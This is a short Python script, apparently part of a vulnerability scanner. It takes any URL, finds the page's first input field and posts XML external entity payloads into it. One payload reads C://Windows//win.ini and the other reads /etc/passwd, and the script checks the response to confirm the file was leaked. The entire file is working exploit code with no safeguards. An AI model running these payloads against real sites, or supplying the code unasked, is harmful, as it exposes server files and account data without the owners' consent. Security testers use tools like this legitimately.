import requests
from bs4 import BeautifulSoup


def mode_xxe_windows(url):
    response = requests.get(url)
    soup = BeautifulSoup(response.text, 'html.parser')
    input_box = soup.find('input')
    if input_box:
        name_attr = input_box.get('name')

        # scan_scope = url + "/"
        data = {
            name_attr: '<?xml version = "1.0"?><!DOCTYPE ANY [  <!ENTITY f SYSTEM "file:///C://Windows//win.ini"> '
                       ']><x>&f;</x>',
            "submit": "%E6%8F%90%E4%BA%A4",
        }
        post_response = requests.post(url, data=data)
        # input_box = soup.find('input')
        if "extensions" in post_response.text:
            return True, url, data, "xxe_yes"
        else:
            return False, url
    else:
        return False, url


def mode_xxe_linux(url):
    response = requests.get(url)
    soup = BeautifulSoup(response.text, 'html.parser')
    input_box = soup.find('input')
    if input_box:
        name_attr = input_box.get('name')

        # scan_scope = url + "/"
        data = {
            name_attr: '<?xml version = "1.0"?><!DOCTYPE ANY [  <!ENTITY f SYSTEM "file:///etc/passwd"> '
                       ']><x>&f;</x>',
            "submit": "%E6%8F%90%E4%BA%A4",
        }
        post_response = requests.post(url, data=data)
        # input_box = soup.find('input')
        if "/bin/bash" in post_response.text:
            return True, url, data, "xxe_yes"
        else:
            return False, url
    else:
        return False, url
